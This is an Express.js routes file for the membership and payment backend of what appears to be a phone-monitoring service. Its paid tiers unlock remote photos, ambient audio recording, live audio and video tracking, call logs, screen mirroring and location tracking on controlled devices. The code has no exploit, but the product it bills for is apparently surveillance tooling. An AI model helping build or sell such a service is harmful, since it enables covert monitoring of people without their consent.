/**
 * 会员管理路由
 */

const express = require('express');
const router = express.Router();
const { body, query, validationResult } = require('express-validator');
const { authenticateToken } = require('../middleware/auth');
const membershipController = require('../controllers/membershipController');

/**
 * 获取会员配置
 */
router.get('/config',
  membershipController.getMembershipConfig
);

/**
 * 获取用户会员信息
 */
router.get('/info',
  authenticateToken,
  membershipController.getUserMembershipInfo
);

/**
 * 购买会员
 */
router.post('/purchase',
  authenticateToken,
  [
    body('membership_type')
      .isIn(['monthly', 'quarterly', 'semi_annual', 'annual', 'lifetime'])
      .withMessage('会员类型无效'),
    body('payment_method')
      .isIn(['alipay', 'wechat', 'third_party'])
      .withMessage('支付方式无效'),
    body('agent_code')
      .optional()
      .isString()
      .isLength({ min: 4, max: 4 })
      .withMessage('代理码必须是4位字符')
  ],
  membershipController.purchaseMembership
);

/**
 * 支付回调处理
 */
router.post('/payment/callback',
  [
    body('order_id')
      .notEmpty()
      .withMessage('订单ID不能为空'),
    body('payment_status')
      .isIn(['success', 'failed', 'pending'])
      .withMessage('支付状态无效'),
    body('transaction_id')
      .optional()
      .isString()
      .withMessage('交易ID必须是字符串'),
    body('signature')
      .notEmpty()
      .withMessage('签名不能为空')
  ],
  membershipController.handlePaymentCallback
);

/**
 * 获取订单列表
 */
router.get('/orders',
  authenticateToken,
  [
    query('status')
      .optional()
      .isIn(['pending', 'paid', 'failed', 'cancelled', 'refunded'])
      .withMessage('订单状态无效'),
    query('page')
      .optional()
      .isInt({ min: 1 })
      .withMessage('页码必须是正整数'),
    query('limit')
      .optional()
      .isInt({ min: 1, max: 50 })
      .withMessage('每页数量必须在1-50之间')
  ],
  membershipController.getOrderList
);

/**
 * 获取功能使用限制
 */
router.get('/limits',
  authenticateToken,
  membershipController.getUsageLimits
);

/**
 * 激活会员（管理员功能）
 */
router.post('/activate',
  authenticateToken,
  [
    body('user_id')
      .isInt({ min: 1 })
      .withMessage('用户ID必须是正整数'),
    body('membership_type')
      .isIn(['monthly', 'quarterly', 'semi_annual', 'annual', 'lifetime'])
      .withMessage('会员类型无效'),
    body('duration_months')
      .optional()
      .isInt({ min: 1 })
      .withMessage('会员时长必须是正整数')
  ],
  async (req, res) => {
    try {
      // 检查管理员权限
      if (req.user.role !== 'admin') {
        return res.status(403).json({
          success: false,
          message: '无权限执行此操作'
        });
      }
      
      const { user_id, membership_type, duration_months } = req.body;
      const result = await membershipController.activateMembership(user_id, membership_type, duration_months);
      
      res.json({
        success: true,
        message: '会员已激活',
        data: result
      });
    } catch (error) {
      res.status(500).json({
        success: false,
        message: '激活会员失败'
      });
    }
  }
);

/**
 * 获取用户使用统计
 */
router.get('/usage/stats',
  authenticateToken,
  [
    query('start_date')
      .optional()
      .isISO8601()
      .withMessage('开始日期格式无效'),
    query('end_date')
      .optional()
      .isISO8601()
      .withMessage('结束日期格式无效')
  ],
  membershipController.getUserUsageStats
);

/**
 * 获取用户每日使用统计
 */
router.get('/usage/daily',
  authenticateToken,
  [
    query('date')
      .optional()
      .isISO8601()
      .withMessage('日期格式无效')
  ],
  membershipController.getUserDailyUsage
);

/**
 * 获取订单详情
 */
router.get('/orders/:orderId',
  authenticateToken,
  async (req, res) => {
    try {
      const { orderId } = req.params;
      const { queryOne } = require('../database/connection');
      
      // 获取订单信息
      const order = await queryOne(`
        SELECT 
          o.*,
          u.phone,
          u.nickname
        FROM orders o
        LEFT JOIN users u ON o.user_id = u.id
        WHERE o.order_id = ?
      `, [orderId]);
      
      if (!order) {
        return res.status(404).json({
          success: false,
          message: '订单不存在'
        });
      }
      
      // 检查权限
      if (order.user_id !== req.user.id && req.user.role !== 'admin') {
        return res.status(403).json({
          success: false,
          message: '无权限查看此订单'
        });
      }
      
      res.json({
        success: true,
        data: {
          ...order,
          payment_info: order.payment_info ? JSON.parse(order.payment_info) : null
        }
      });
    } catch (error) {
      res.status(500).json({
        success: false,
        message: '获取订单详情失败'
      });
    }
  }
);

/**
 * 取消订单
 */
router.post('/orders/:orderId/cancel',
  authenticateToken,
  async (req, res) => {
    try {
      const { orderId } = req.params;
      const { queryOne, update } = require('../database/connection');
      
      // 获取订单信息
      const order = await queryOne('SELECT * FROM orders WHERE order_id = ?', [orderId]);
      if (!order) {
        return res.status(404).json({
          success: false,
          message: '订单不存在'
        });
      }
      
      // 检查权限
      if (order.user_id !== req.user.id) {
        return res.status(403).json({
          success: false,
          message: '无权限取消此订单'
        });
      }
      
      // 检查订单状态
      if (order.status !== 'pending') {
        return res.status(400).json({
          success: false,
          message: '只能取消待支付的订单'
        });
      }
      
      // 更新订单状态
      await update('orders', {
        status: 'cancelled',
        updated_time: new Date()
      }, { order_id: orderId });
      
      res.json({
        success: true,
        message: '订单已取消'
      });
    } catch (error) {
      res.status(500).json({
        success: false,
        message: '取消订单失败'
      });
    }
  }
);

/**
 * 重新支付订单
 */
router.post('/orders/:orderId/repay',
  authenticateToken,
  [
    body('payment_method')
      .isIn(['alipay', 'wechat', 'third_party'])
      .withMessage('支付方式无效')
  ],
  async (req, res) => {
    try {
      const { orderId } = req.params;
      const { payment_method } = req.body;
      const { queryOne, update } = require('../database/connection');
      
      // 获取订单信息
      const order = await queryOne('SELECT * FROM orders WHERE order_id = ?', [orderId]);
      if (!order) {
        return res.status(404).json({
          success: false,
          message: '订单不存在'
        });
      }
      
      // 检查权限
      if (order.user_id !== req.user.id) {
        return res.status(403).json({
          success: false,
          message: '无权限操作此订单'
        });
      }
      
      // 检查订单状态
      if (order.status !== 'pending' && order.status !== 'failed') {
        return res.status(400).json({
          success: false,
          message: '订单状态不允许重新支付'
        });
      }
      
      // 生成新的支付信息
      const paymentInfo = await membershipController.generatePaymentInfo(
        order.amount,
        payment_method,
        orderId
      );
      
      // 更新订单支付方式
      await update('orders', {
        payment_method,
        payment_info: JSON.stringify(paymentInfo),
        updated_time: new Date()
      }, { order_id: orderId });
      
      res.json({
        success: true,
        message: '支付信息已更新',
        data: paymentInfo
      });
    } catch (error) {
      res.status(500).json({
        success: false,
        message: '重新支付失败'
      });
    }
  }
);

/**
 * 获取会员权益说明
 */
router.get('/benefits',
  async (req, res) => {
    try {
      const config = require('../config/config');
      
      res.json({
        success: true,
        data: {
          membership_types: {
            free: {
              name: '免费版',
              price: 0,
              duration: '永久',
              features: {
                remote_photo: { limit: 5, name: '远程拍照' },
                environment_audio: { limit: 2, name: '环境录音' },
                remote_video: { limit: 1, name: '远程录像' },
                live_audio: { limit: 0, name: '实况语音追踪' },
                live_video: { limit: 0, name: '实况视频追踪' },
                call_logs: { limit: 1, name: '通话记录' },
                screenshot: { limit: 10, name: '截屏' },
                screen_record: { limit: 0, name: '录屏' },
                live_screen: { limit: 0, name: '实时同屏' },
                location_tracking: { limit: 5, name: '位置追踪' },
                app_usage: { limit: 1, name: '应用使用记录' },
                device_control: { limit: 1, name: '设备控制数量' }
              }
            },
            monthly: {
              name: '包月会员',
              price: config.membership.prices.monthly,
              duration: '1个月',
              features: {
                remote_photo: { limit: 100, name: '远程拍照' },
                environment_audio: { limit: 50, name: '环境录音' },
                remote_video: { limit: 30, name: '远程录像' },
                live_audio: { limit: 20, name: '实况语音追踪' },
                live_video: { limit: 15, name: '实况视频追踪' },
                call_logs: { limit: 30, name: '通话记录' },
                screenshot: { limit: 200, name: '截屏' },
                screen_record: { limit: 20, name: '录屏' },
                live_screen: { limit: 10, name: '实时同屏' },
                location_tracking: { limit: 100, name: '位置追踪' },
                app_usage: { limit: 30, name: '应用使用记录' },
                device_control: { limit: 3, name: '设备控制数量' }
              }
            },
            quarterly: {
              name: '包季会员',
              price: config.membership.prices.quarterly,
              duration: '3个月',
              features: {
                remote_photo: { limit: 300, name: '远程拍照' },
                environment_audio: { limit: 150, name: '环境录音' },
                remote_video: { limit: 100, name: '远程录像' },
                live_audio: { limit: 60, name: '实况语音追踪' },
                live_video: { limit: 50, name: '实况视频追踪' },
                call_logs: { limit: 100, name: '通话记录' },
                screenshot: { limit: 600, name: '截屏' },
                screen_record: { limit: 60, name: '录屏' },
                live_screen: { limit: 30, name: '实时同屏' },
                location_tracking: { limit: 300, name: '位置追踪' },
                app_usage: { limit: 100, name: '应用使用记录' },
                device_control: { limit: 5, name: '设备控制数量' }
              }
            },
            semi_annual: {
              name: '半年会员',
              price: config.membership.prices.semi_annual,
              duration: '6个月',
              features: {
                remote_photo: { limit: 600, name: '远程拍照' },
                environment_audio: { limit: 300, name: '环境录音' },
                remote_video: { limit: 200, name: '远程录像' },
                live_audio: { limit: 120, name: '实况语音追踪' },
                live_video: { limit: 100, name: '实况视频追踪' },
                call_logs: { limit: 200, name: '通话记录' },
                screenshot: { limit: 1200, name: '截屏' },
                screen_record: { limit: 120, name: '录屏' },
                live_screen: { limit: 60, name: '实时同屏' },
                location_tracking: { limit: 600, name: '位置追踪' },
                app_usage: { limit: 200, name: '应用使用记录' },
                device_control: { limit: 8, name: '设备控制数量' }
              }
            },
            annual: {
              name: '包年会员',
              price: config.membership.prices.annual,
              duration: '1年',
              features: {
                remote_photo: { limit: 1500, name: '远程拍照' },
                environment_audio: { limit: 800, name: '环境录音' },
                remote_video: { limit: 500, name: '远程录像' },
                live_audio: { limit: 300, name: '实况语音追踪' },
                live_video: { limit: 250, name: '实况视频追踪' },
                call_logs: { limit: 500, name: '通话记录' },
                screenshot: { limit: 3000, name: '截屏' },
                screen_record: { limit: 300, name: '录屏' },
                live_screen: { limit: 150, name: '实时同屏' },
                location_tracking: { limit: 1500, name: '位置追踪' },
                app_usage: { limit: 500, name: '应用使用记录' },
                device_control: { limit: 15, name: '设备控制数量' }
              }
            },
            lifetime: {
              name: '永久会员',
              price: config.membership.prices.lifetime,
              duration: '永久',
              features: {
                remote_photo: { limit: -1, name: '远程拍照' },
                environment_audio: { limit: -1, name: '环境录音' },
                remote_video: { limit: -1, name: '远程录像' },
                live_audio: { limit: -1, name: '实况语音追踪' },
                live_video: { limit: -1, name: '实况视频追踪' },
                call_logs: { limit: -1, name: '通话记录' },
                screenshot: { limit: -1, name: '截屏' },
                screen_record: { limit: -1, name: '录屏' },
                live_screen: { limit: -1, name: '实时同屏' },
                location_tracking: { limit: -1, name: '位置追踪' },
                app_usage: { limit: -1, name: '应用使用记录' },
                device_control: { limit: 50, name: '设备控制数量' }
              }
            }
          },
          note: '注：-1表示无限制使用'
        }
      });
    } catch (error) {
      res.status(500).json({
        success: false,
        message: '获取会员权益失败'
      });
    }
  }
);

module.exports = router;